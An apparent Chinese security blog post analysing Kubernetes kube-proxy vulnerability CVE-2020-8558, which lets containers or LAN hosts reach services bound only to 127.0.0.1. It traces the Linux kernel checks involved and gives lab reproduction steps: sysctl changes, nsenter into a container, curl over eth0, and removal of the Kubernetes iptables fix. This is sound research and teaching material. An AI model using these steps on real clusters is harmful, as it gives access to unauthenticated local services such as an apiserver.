      <time title="创建时间：2022-07-11 16:47:13" itemprop="dateCreated datePublished" datetime="2022-07-11T16:47:13+08:00">2022-07-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-07-20 11:23:51" itemprop="dateModified" datetime="2022-07-20T11:23:51+08:00">2022-07-20</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>假设机器A和机器B在同一个局域网，机器A使用<code>nc -l 127.0.0.1 8888</code>，在机器B上可以访问机器A上”仅绑定在127.0.0.1的服务”吗？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# nc -l 127.0.0.1 8888 &amp;</span><br><span class="line">[1] 44283</span><br><span class="line">[root@instance-h9w7mlyv ~]# netstat -antp|grep 8888</span><br><span class="line">tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      44283&#x2F;nc</span><br></pre></td></tr></table></figure>

<blockquote>
<p>nc用法可能不同，有的使用 nc -l 127.0.0.1 -p 8888 监听8888端口</p>
</blockquote>
<p>kubernetes的kube-proxy组件之前披露过CVE-2020-8558漏洞，这个漏洞就可以让”容器内的恶意用户、同一局域网其他机器”访问到node节点上”仅绑定在127.0.0.1的服务”。这样有可能访问到监听在本地的”kubernetes无需认证的apiserver”，进而控制集群。</p>
<p>本文会带你做两种网络环境(vpc和docker网桥模式)下的漏洞原理分析，并复现漏洞。</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="怎么复现？"><a href="#怎么复现？" class="headerlink" title="怎么复现？"></a>怎么复现？</h2><p>先说最终结果，我已经做好基于<a target="_blank" rel="noopener" href="https://www.terraform.io/">terraform</a>的<a target="_blank" rel="noopener" href="https://github.com/HuoCorp/TerraformGoat/blob/main/kubernetes/kube-proxy/CVE-2020-8558/README_CN.md">漏洞靶场</a>。</p>
<blockquote>
<p>terraform可以基于声明式api编排云上的基础设施(虚拟机、网络等)</p>
</blockquote>
<p>你也可以按照文章后面的步骤来复现漏洞。</p>
<h2 id="为什么可以访问其他节点的”仅绑定在127-0-0-1的服务”？"><a href="#为什么可以访问其他节点的”仅绑定在127-0-0-1的服务”？" class="headerlink" title="为什么可以访问其他节点的”仅绑定在127.0.0.1的服务”？"></a>为什么可以访问其他节点的”仅绑定在127.0.0.1的服务”？</h2><p>假设实验环境是，一个局域网内有两个节点A和B、交换机，ip地址分别是ip_a和ip_b，mac地址分别是mac_a和mac_b。</p>
<p>来看看A机器访问B机器时的一个攻击场景。</p>
<p>如果在tcp握手时，A机器构造一个”恶意的syn包”，数据包信息是：</p>
<table>
<thead>
<tr>
<th>源ip</th>
<th>源mac</th>
<th>目的ip</th>
<th>目的mac</th>
<th>目的端口</th>
<th>源端口</th>
</tr>
</thead>
<tbody><tr>
<td>ip_a</td>
<td>mac_a</td>
<td>127.0.0.1</td>
<td>mac_b</td>
<td>8888</td>
<td>44444(某个随机端口)</td>
</tr>
</tbody></table>
<p>此时如果交换机只是根据mac地址做数据转发，它就将syn包发送给B。</p>
<p>syn包的数据流向是：A -&gt; 交换机 -&gt; B</p>
<p>B机器网卡在接收到syn包后：</p>
<ul>
<li>链路层：发现目的mac是自己，于是扔给网络层处理</li>
<li>网络层：发现ip是本机网卡ip，看来要给传输层处理，而不是转发</li>
<li>传输层：发现当前”网络命名空间”确实有服务监听 <code>127.0.0.1:8888</code>, 和 “目的ip:目的端口” 可以匹配上，于是准备回复syn-ack包</li>
</ul>
<blockquote>
<p>从”内核协议栈”角度看，发送包会经过”传输层、网络层、链路层、设备驱动”，接受包刚好相反，会经过”设备驱动、链路层、网络层、传输层”</p>
</blockquote>
<p>syn-ack数据包信息是:</p>
<table>
<thead>
<tr>
<th>源ip</th>
<th>源mac</th>
<th>目的ip</th>
<th>目的mac</th>
<th>目的端口</th>
<th>源端口</th>
</tr>
</thead>
<tbody><tr>
<td>127.0.0.1</td>
<td>mac_b</td>
<td>ip_a</td>
<td>mac_a</td>
<td>44444(某个随机端口)</td>
<td>8888</td>
</tr>
</tbody></table>
<p>syn-ack包的数据流向是：B -&gt; 交换机 -&gt; A</p>
<p>A机器网卡在收到syn-ack包后，也会走一遍”内核协议栈”的流程，然后发送ack包，完成tcp握手。</p>
<p>这样A就能访问到B机器上”仅绑定在127.0.0.1的服务”。所以，在局域网内，恶意节点”似乎”很容易就能访问到其他节点的”仅绑定在127.0.0.1的服务”。</p>
<p>但实际上，A访问到B机器上”仅绑定在127.0.0.1的服务”会因为两大类原因失败：</p>
<ul>
<li>交换机有做检查，比如它不允许数据包的目的ip地址是127.0.0.1，这样第一个syn包就不会转发给B，tcp握手会失败。公有云厂商的交换机(比如ovs)应该就有类似检查，所以我在某个公有云厂商vpc网络环境下测试，无法成功复现漏洞。</li>
<li>数据包到了主机，但是因为ip是127.0.0.1，很特殊，所以”内核协议栈”为了安全把包丢掉了。</li>
</ul>
<p>所以不能在云vpc环境下实验，于是我选择了复现”容器访问宿主机上的仅绑定在127.0.0.1的服务”。</p>
<p>先来看一下，”内核协议栈”为了防止恶意访问”仅绑定在127.0.0.1的服务”都做了哪些限制。</p>
<h1 id="“内核协议栈”做了哪些限制？"><a href="#“内核协议栈”做了哪些限制？" class="headerlink" title="“内核协议栈”做了哪些限制？"></a>“内核协议栈”做了哪些限制？</h1><p>先说结论，下面三个内核参数都会影响</p>
<ul>
<li>route_localnet</li>
<li>rp_filter</li>
<li>accept_local</li>
</ul>
<p>以docker网桥模式为例，想要在docker容器中访问到宿主机的”仅绑定在127.0.0.1的服务”，就需要：</p>
<ul>
<li>宿主机上 route_localnet=1</li>
<li>docker容器中 rp_filter=0、accept_local=1、route_localnet=1</li>
</ul>
<p>宿主机网络命名空间中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep route_localnet</span><br><span class="line">net.ipv4.conf.all.route_localnet &#x3D; 1</span><br><span class="line">net.ipv4.conf.default.route_localnet &#x3D; 1</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>容器网络命名空间中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep accept_local</span><br><span class="line">net.ipv4.conf.all.accept_local &#x3D; 1</span><br><span class="line">net.ipv4.conf.default.accept_local &#x3D; 1</span><br><span class="line">net.ipv4.conf.eth0.accept_local &#x3D; 1</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -a|grep &#39;\.rp_filter&#39;</span><br><span class="line">net.ipv4.conf.all.rp_filter &#x3D; 0</span><br><span class="line">net.ipv4.conf.default.rp_filter &#x3D; 0</span><br><span class="line">net.ipv4.conf.eth0.rp_filter &#x3D; 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>容器中和宿主机中因为是不同的网络命名空间，所以关于网络的内核参数是隔离的，并一定相同。</p>
</blockquote>
<h1 id="route-localnet配置"><a href="#route-localnet配置" class="headerlink" title="route_localnet配置"></a>route_localnet配置</h1><h2 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h2><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核文档</a>提到route_localnet参数，如果route_localnet等于0，当收到源ip或者目的ip是”loopback地址”(127.0.0.0/8)时，就会认为是非法数据包，将数据包丢弃。</p>
<blockquote>
<p>宿主机上curl 127.0.0.1时，源ip和目的都是127.0.0.1，此时网络能正常通信，说明数据包并没有被丢弃。说明这种情景下，没有调用到 ip_route_input_noref 函数查找路由表。</p>
</blockquote>
<p>CVE-2020-8558漏洞中，kube-proxy设置route_localnet=1，导致关闭了上面所说的检查。</p>
<h2 id="内核协议栈中哪里用route-localnet配置来检查？"><a href="#内核协议栈中哪里用route-localnet配置来检查？" class="headerlink" title="内核协议栈中哪里用route_localnet配置来检查？"></a>内核协议栈中哪里用route_localnet配置来检查？</h2><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/route.c#L1912">https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/route.c#L1912</a></p>
<p>ip_route_input_slow 函数中用到 route_localnet配置，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> *	NOTE. We drop all the packets that has local source</span><br><span class="line"> *	addresses, because every properly looped back packet</span><br><span class="line"> *	must have correct destination already attached by output routine.</span><br><span class="line"> *</span><br><span class="line"> *	Such approach solves two big problems:</span><br><span class="line"> *	1. Not simplex devices are handled properly.</span><br><span class="line"> *	2. IP spoofing attempts are filtered with 100% of guarantee.</span><br><span class="line"> *	called with rcu_read_lock()</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">static int ip_route_input_slow(struct sk_buff *skb, __be32 daddr, __be32 saddr,</span><br><span class="line">			       u8 tos, struct net_device *dev,</span><br><span class="line">			       struct fib_result *res)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">	&#x2F;* Following code try to avoid calling IN_DEV_NET_ROUTE_LOCALNET(),</span><br><span class="line">	 * and call it once if daddr or&#x2F;and saddr are loopback addresses</span><br><span class="line">	 *&#x2F;</span><br><span class="line">	if (ipv4_is_loopback(daddr)) &#123;		&#x2F;&#x2F; 目的地址是否&quot;loopback地址&quot;</span><br><span class="line">		if (!IN_DEV_NET_ROUTE_LOCALNET(in_dev, net))	&#x2F;&#x2F; localnet配置是否开启。net是网络命名空间，in_dev是接收数据包设备配置信息</span><br><span class="line">			goto martian_destination;		&#x2F;&#x2F; 认为是非法数据包</span><br><span class="line">	&#125; else if (ipv4_is_loopback(saddr)) &#123;		&#x2F;&#x2F; 源地址是否&quot;loopback地址&quot;</span><br><span class="line">		if (!IN_DEV_NET_ROUTE_LOCALNET(in_dev, net))</span><br><span class="line">			goto martian_source;	&#x2F;&#x2F; 认为是非法数据包</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	err &#x3D; fib_lookup(net, &amp;fl4, res, 0);		&#x2F;&#x2F; 查找&quot;路由表&quot;，res存放查找结果</span><br><span class="line">	...</span><br><span class="line">	if (res-&gt;type &#x3D;&#x3D; RTN_BROADCAST)</span><br><span class="line">	...</span><br><span class="line">	if (res-&gt;type &#x3D;&#x3D; RTN_LOCAL) &#123;	&#x2F;&#x2F; 数据包应该本机处理</span><br><span class="line">		err &#x3D; fib_validate_source(skb, saddr, daddr, tos,</span><br><span class="line">				  0, dev, in_dev, &amp;itag);  &#x2F;&#x2F; &quot;反向查找&quot;, 验证源地址是否有问题</span><br><span class="line">		if (err &lt; 0)</span><br><span class="line">			goto martian_source;</span><br><span class="line">		goto local_input; &#x2F;&#x2F; 本机处理</span><br><span class="line">	&#125;</span><br><span class="line">	if (!IN_DEV_FORWARD(in_dev)) &#123;   &#x2F;&#x2F; 没有开启ip_forward配置时，认为不支持 转发数据包</span><br><span class="line">		err &#x3D; -EHOSTUNREACH;</span><br><span class="line">		goto no_route;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	err &#x3D; ip_mkroute_input(skb, res, in_dev, daddr, saddr, tos, flkeys); 	&#x2F;&#x2F; 认为此包需要&quot;转发&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">static int ip_rcv_finish(struct net *net, struct sock *sk, struct sk_buff *skb)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	&#x2F;*</span><br><span class="line">	 *	Initialise the virtual path cache for the packet. It describes</span><br><span class="line">	 *	how the packet travels inside Linux networking.</span><br><span class="line">	 *&#x2F;</span><br><span class="line">	if (!skb_valid_dst(skb)) &#123;	&#x2F;&#x2F; 是否有路由缓存. 宿主机curl 127.0.0.1时，就有缓存，不用查找路由表。</span><br><span class="line">		err &#x3D; ip_route_input_noref(skb, iph-&gt;daddr, iph-&gt;saddr,</span><br><span class="line">					   iph-&gt;tos, dev);	&#x2F;&#x2F; 查找路由表</span><br><span class="line">		if (unlikely(err))</span><br><span class="line">			goto drop_error;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	return dst_input(skb);   &#x2F;&#x2F; 将数据包交给tcp层(ip_local_deliver) 或 转发数据包(ip_forward)</span><br></pre></td></tr></table></figure>

<p>在收到数据包时，从ip层来看，数据包会经过 ip_rcv(ip层入口函数) -&gt; ip_rcv_finish -&gt; ip_route_input_slow。</p>
<p>在ip_route_input_slow函数中可以看到，如果源ip或者目的ip是”loopback地址”，并且接收数据包的设备没有配置route_localnet选项时，就会认为是非法数据包。</p>
<h1 id="rp-filter和accept-local"><a href="#rp-filter和accept-local" class="headerlink" title="rp_filter和accept_local"></a>rp_filter和accept_local</h1><h2 id="是什么？-1"><a href="#是什么？-1" class="headerlink" title="是什么？"></a>是什么？</h2><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核网络参数详解</a> 提到，rp_filter=1时，会严格验证源ip。</p>
<p>怎么检查源ip呢？就是收到数据包后，将源ip和目的ip对调，然后再查找路由表，找到会用哪个设备回包。如果”回包的设备”和”收到数据包的设备”不一致，就有可能校验失败。这个也就是后面说的”反向检查”。</p>
<h2 id="内核协议栈中哪里用rp-filter和accept-local配置来检查？"><a href="#内核协议栈中哪里用rp-filter和accept-local配置来检查？" class="headerlink" title="内核协议栈中哪里用rp_filter和accept_local配置来检查？"></a>内核协议栈中哪里用rp_filter和accept_local配置来检查？</h2><p>上面提到 收到数据包时，从ip层来看，会执行 ip_route_input_slow 函数查找路由表。</p>
<p>ip_route_input_slow 函数会执行 fib_validate_source 函数执行 “验证源ip”，会使用到rp_filter和accept_local配置</p>
<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/fib_frontend.c#L412">https://elixir.bootlin.com/linux/v4.18/source/net/ipv4/fib_frontend.c#L412</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Ignore rp_filter for packets protected by IPsec. *&#x2F;</span><br><span class="line">int fib_validate_source(struct sk_buff *skb, __be32 src, __be32 dst,</span><br><span class="line">			u8 tos, int oif, struct net_device *dev,</span><br><span class="line">			struct in_device *idev, u32 *itag)</span><br><span class="line">&#123;</span><br><span class="line">	int r &#x3D; secpath_exists(skb) ? 0 : IN_DEV_RPFILTER(idev);	&#x2F;&#x2F; r&#x3D;rp_filter配置</span><br><span class="line">	struct net *net &#x3D; dev_net(dev);</span><br><span class="line"></span><br><span class="line">	if (!r &amp;&amp; !fib_num_tclassid_users(net) &amp;&amp;</span><br><span class="line">	    (dev-&gt;ifindex !&#x3D; oif || !IN_DEV_TX_REDIRECTS(idev))) &#123;		&#x2F;&#x2F; dev-&gt;ifindex !&#x3D; oif 表示 不是lo虚拟网卡接收到包</span><br><span class="line">		if (IN_DEV_ACCEPT_LOCAL(idev))			&#x2F;&#x2F; accept_local配置是否打开。idev是接受数据包的网卡配置</span><br><span class="line">			goto ok;</span><br><span class="line">		&#x2F;* with custom local routes in place, checking local addresses</span><br><span class="line">		 * only will be too optimistic, with custom rules, checking</span><br><span class="line">		 * local addresses only can be too strict, e.g. due to vrf</span><br><span class="line">		 *&#x2F;</span><br><span class="line">		if (net-&gt;ipv4.fib_has_custom_local_routes ||</span><br><span class="line">		    fib4_has_custom_rules(net))		&#x2F;&#x2F;  检查&quot;网络命名空间&quot;中是否有自定义的&quot;策略路由&quot;</span><br><span class="line">			goto full_check;</span><br><span class="line">		if (inet_lookup_ifaddr_rcu(net, src))		&#x2F;&#x2F; 检查&quot;网络命名空间&quot;中是否有设备的ip和源ip(src值)相同</span><br><span class="line">			return -EINVAL;</span><br><span class="line"></span><br><span class="line">ok:</span><br><span class="line">		*itag &#x3D; 0;</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">full_check:</span><br><span class="line">	return __fib_validate_source(skb, src, dst, tos, oif, dev, r, idev, itag);		&#x2F;&#x2F; __fib_validate_source中会执行&quot;反向检查源ip&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当在容器中<code>curl 127.0.0.1 --interface eth0</code>时，有一些结论：</p>
<ul>
<li>宿主机收到请求包时，无论 accept_local和rp_filter是啥值，都通过fib_validate_source检查</li>
<li>容器中收到请求包时，必须要设置 accept_local=1、rp_filter=0，才能不被”反向检查源ip”</li>
</ul>
<p>如果容器中 accept_local=1、rp_filter=0 有一个条件不成立，就会发生丢包。这个时候如果你在容器网络命名空间用<code>tcpdump -i eth0 &#39;port 8888&#39; -n -e</code>观察，就会发现诡异的现象：容器接收到了syn-ack包，但是没有回第三个ack握手包。如下图<br><img src="https://user-images.githubusercontent.com/1846319/178766286-0fe2fa0d-19e7-40d0-bb7e-1b6c48d05543.png" alt="img"></p>
<blockquote>
<p>小技巧：nsenter -n -t 容器进程pid 可以进入到容器网络空间，接着就可以tcpdump抓”容器网络中的包”</p>
</blockquote>
<h1 id="docker网桥模式下复现漏洞"><a href="#docker网桥模式下复现漏洞" class="headerlink" title="docker网桥模式下复现漏洞"></a>docker网桥模式下复现漏洞</h1><h2 id="docker网桥模式下漏洞原理是什么？"><a href="#docker网桥模式下漏洞原理是什么？" class="headerlink" title="docker网桥模式下漏洞原理是什么？"></a>docker网桥模式下漏洞原理是什么？</h2><p>借用网络上的一张图来说明docker网桥模式<br><img src="https://s2.51cto.com/wyfs02/M01/95/EE/wKiom1kbITPzNeJPAABs0ju69Io610.png-wh_500x0-wm_3-wmp_4-s_2144315777.png" alt="img"></p>
<p>在容器内<code>curl 127.0.0.1:8888 --interface eth0</code>时，发送第一个syn包时，在网络层查找路由表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# ip route show</span><br><span class="line">default via 172.17.0.1 dev eth0</span><br><span class="line">172.17.0.0&#x2F;16 dev eth0 proto kernel scope link src 172.17.0.3</span><br></pre></td></tr></table></figure>
<p>因此会走默认网关(172.17.0.1)，在链路层就会找网关的mac地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# arp -a|grep 172.17.0.1</span><br><span class="line">_gateway (172.17.0.1) at 02:42:af:2e:cd:ae [ether] on eth0</span><br></pre></td></tr></table></figure>

<p>实际上<code>02:42:af:2e:cd:ae</code>就是docker0网桥的mac地址，所以网关就是docker0网桥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# ifconfig docker0</span><br><span class="line">docker0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        ...</span><br><span class="line">        ether 02:42:af:2e:cd:ae  txqueuelen 0  (Ethernet)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>因此第一个syn包信息是</p>
<table>
<thead>
<tr>
<th>源ip</th>
<th>目的ip</th>
<th>源mac</th>
<th>目的mac</th>
<th>源端口</th>
<th>目的端口</th>
</tr>
</thead>
<tbody><tr>
<td>容器eth0 ip</td>
<td>127.0.0.1</td>
<td>容器eth0 mac</td>
<td>docker0 mac</td>
<td>4444(随机端口)</td>
<td>8888</td>
</tr>
</tbody></table>
<p>syn包数据包数据流向是 容器内eth0 -&gt; veth -&gt; docker0。</p>
<p>veth设备作为docker0网桥的”从设备”，接收到syn包后直接转发，不会调用到”内核协议栈”的网络层。</p>
<p>docker0网桥设备收到syn包后，在”内核协议栈”的链路层，看到目的mac是自己，就把包扔给网络层处理。在网络层查路由表，看到目的ip是本机ip，就将包扔给传输层处理。在传输层看到访问”127.0.0.1:8888”，就会查看是不是有服务监听在”127.0.0.1:8888”。</p>
<h2 id="怎么复现？-1"><a href="#怎么复现？-1" class="headerlink" title="怎么复现？"></a>怎么复现？</h2><p>从上面分析可以看出来，需要将宿主机docker0网桥设备route_localnet设置成1。</p>
<p>宿主机docker0网桥设备需要设置rp_filter和accept_local选项吗？答案是不需要，因为docker0网桥设备在收到数据包在网络层做”反向检查源地址”时，会知道”响应数据包”也从docker0网桥发送。”发送和接收数据包的设备”是匹配的，所以能通过”反向检查源地址”的校验。</p>
<p>容器中eth0网卡需要设置rp_filter=0、accept_local=1、localnet=1。为什么容器中eth0网卡需要设置rp_filter和accept_local选项呢？因为eth0网桥设备如果做”反向检查源地址”，就会知道响应包应该从lo网卡发送。”接收到数据包的设备是eth0网卡”，而”发送数据包的设备应该是lo网卡”，两个设备不匹配，”反向检查”就会失败。rp_filter=0、accept_local=1可以避免做”反向检查源地址”。</p>
<blockquote>
<p>即使ifconfig lo down，<code>ip route show table local</code>仍能看到local表中有回环地址的路由。</p>
</blockquote>
<p>下面你可以跟着我来用docker复现漏洞。</p>
<p>首先在宿主机上打开route_localnet配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.route_localnet&#x3D;1</span><br></pre></td></tr></table></figure>

<p>然后创建容器，并进入到容器网络命名空间，设置rp_filter=0、accept_local=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-h9w7mlyv ~]# docker run -d busybox tail -f &#x2F;dev&#x2F;null		&#x2F;&#x2F; 创建容器</span><br><span class="line">62ba93fbbe7a939b7fff9a9598b546399ab26ea97858e73759addadabc3ad1f3</span><br><span class="line">[root@instance-h9w7mlyv ~]# docker top 62ba93fbbe7a939b7fff9a9598b546399ab26ea97858e73759addadabc3ad1f3</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                43244               43224               0                   12:33               ?                   00:00:00            tail -f &#x2F;dev&#x2F;null</span><br><span class="line">[root@instance-h9w7mlyv ~]# nsenter -n -t 43244		&#x2F;&#x2F; 进入到容器网络命名空间</span><br><span class="line">[root@instance-h9w7mlyv ~]#</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.accept_local&#x3D;1	&#x2F;&#x2F; 设置容器中的accept_local配置</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.all.rp_filter&#x3D;0		&#x2F;&#x2F; 设置容器中的rp_filter配置</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.default.rp_filter&#x3D;0</span><br><span class="line">[root@instance-h9w7mlyv ~]# sysctl -w net.ipv4.conf.eth0.rp_filter&#x3D;0</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果你是<code>docker exec -ti busybox sh</code>进入到容器中，然后执行<code>sysctl -w</code>配置内核参数，就会发现报错，因为/proc/sys目录默认是作为只读挂载到容器中的，而内核网络参数就在/proc/sys/net目录下。</p>
</blockquote>
<p>然后就可以在容器中使用<code>curl 127.0.0.1:端口号 --interface eth0</code>来访问宿主机上的服务。</p>
<p><img src="https://user-images.githubusercontent.com/1846319/178901165-c010f034-00fe-4c90-b29a-3cd153a4ae10.png" alt="image"></p>
<h1 id="kubernetes对漏洞的修复"><a href="#kubernetes对漏洞的修复" class="headerlink" title="kubernetes对漏洞的修复"></a>kubernetes对漏洞的修复</h1><p>在 <a target="_blank" rel="noopener" href="https://github.com/kubernetes/kubernetes/pull/91569/commits/8bed088224fb38b41255b37e59a1701caefa171b">这个pr</a> 中kubelet添加了一条iptables规则</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-172-31-14-33:~# iptables-save |grep localnet</span><br><span class="line">-A KUBE-FIREWALL ! -s 127.0.0.0&#x2F;8 -d 127.0.0.0&#x2F;8 -m comment --comment &quot;block incoming localnet connections&quot; -m conntrack ! --ctstate RELATED,ESTABLISHED,DNAT -j DROP</span><br></pre></td></tr></table></figure>

<p>这条规则使得，在tcp握手时，第一个syn包如果目的ip是”环回地址”，同时源ip不是”环回地址”时，包会被丢弃。</p>
<blockquote>
<p>所以如果你复现时是在kubernetes环境下，就需要删掉这条iptables规则。</p>
</blockquote>
<p>或许你会有疑问，源ip不也是可以伪造的嘛。确实是这样，所以在 <a target="_blank" rel="noopener" href="https://github.com/kubernetes/kubernetes/pull/91569">https://github.com/kubernetes/kubernetes/pull/91569</a> 中有人评论到，上面的规则，不能防止访问本地udp服务。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>公有云vpc网络环境下，可能因为交换机有做限制而导致无法访问其他虚拟机的”仅绑定在127.0.0.1的服务”。</p>
<p>docker容器网桥网络环境下，存在漏洞的kube-proxy已经设置了宿主机网络的route_localnet选项，但是因为在容器中<code>/proc/sys</code>默认只读，所以无法修改容器网络命名空间下的内核网络参数，也很难做漏洞利用。</p>
<p>kubernetes的修复方案并不能防止访问本地udp服务。</p>
<blockquote>
<p>如果kubernetes使用了cni插件(比如calico ipip网络模型)，你觉得在node节点能访问到master节点的”仅绑定在127.0.0.1的服务”吗？</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt">内核网络参数详解</a></p>
<!--
在calico cni环境下实验呢？ master node是可以的。【已验证】 worker node应该是不行的
-->

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022-06-13-apisix%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
